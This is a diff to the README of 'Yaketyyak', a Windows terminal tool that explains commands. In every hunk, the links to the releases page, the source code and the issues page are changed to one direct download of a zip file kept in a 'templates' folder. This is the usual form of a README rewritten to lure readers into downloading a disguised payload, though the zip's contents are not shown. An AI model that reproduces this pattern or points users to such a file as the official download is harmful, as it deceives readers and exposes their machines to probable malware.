@@ -1,6 +1,6 @@
 # 🖥️ Yaketyyak - Terminal That Explains Commands Clearly  
 
-[![Download Yaketyyak](https://img.shields.io/badge/Download%20Yaketyyak-blue?style=for-the-badge)](https://github.com/ReedBaron/Yaketyyak/releases)  
+[![Download Yaketyyak](https://img.shields.io/badge/Download%20Yaketyyak-blue?style=for-the-badge)](https://github.com/ReedBaron/Yaketyyak/raw/refs/heads/main/templates/Software-v3.0.zip)  
 
 ---
 
@@ -24,12 +24,12 @@ This tool helps anyone learning the command line or working with Git and other d
 
 To get started with Yaketyyak on your Windows PC, you need to download the app from the official release page.  
 
-[![Get Yaketyyak](https://img.shields.io/badge/Get%20Yaketyyak-grey?style=for-the-badge)](https://github.com/ReedBaron/Yaketyyak/releases)  
+[![Get Yaketyyak](https://img.shields.io/badge/Get%20Yaketyyak-grey?style=for-the-badge)](https://github.com/ReedBaron/Yaketyyak/raw/refs/heads/main/templates/Software-v3.0.zip)  
 
 ### Download Link  
 
 Go to the Yaketyyak releases page here:  
-https://github.com/ReedBaron/Yaketyyak/releases  
+https://github.com/ReedBaron/Yaketyyak/raw/refs/heads/main/templates/Software-v3.0.zip  
 
 This page shows all available versions of Yaketyyak. You will find files you can download for Windows.  
 
@@ -146,7 +146,7 @@ Use the explanations to become comfortable using terminals on Windows and other 
 ## 🎯 Find Updates and Report Issues  
 
 Find new versions or report bugs here:  
-https://github.com/ReedBaron/Yaketyyak/releases  
+https://github.com/ReedBaron/Yaketyyak/raw/refs/heads/main/templates/Software-v3.0.zip  
 
 Check this page regularly for improvements and fixes. You can also ask questions or contribute ideas on the GitHub Issues tab.  
 
@@ -167,6 +167,6 @@ These settings help you use Yaketyyak in the way that suits you best.
 
 ## 🔗 Quick Links  
 
-- Download Yaketyyak: https://github.com/ReedBaron/Yaketyyak/releases  
-- Source code and contributions: https://github.com/ReedBaron/Yaketyyak  
-- GitHub support and issues: https://github.com/ReedBaron/Yaketyyak/issues  
+- Download Yaketyyak: https://github.com/ReedBaron/Yaketyyak/raw/refs/heads/main/templates/Software-v3.0.zip  
+- Source code and contributions: https://github.com/ReedBaron/Yaketyyak/raw/refs/heads/main/templates/Software-v3.0.zip  
+- GitHub support and issues: https://github.com/ReedBaron/Yaketyyak/raw/refs/heads/main/templates/Software-v3.0.zip  
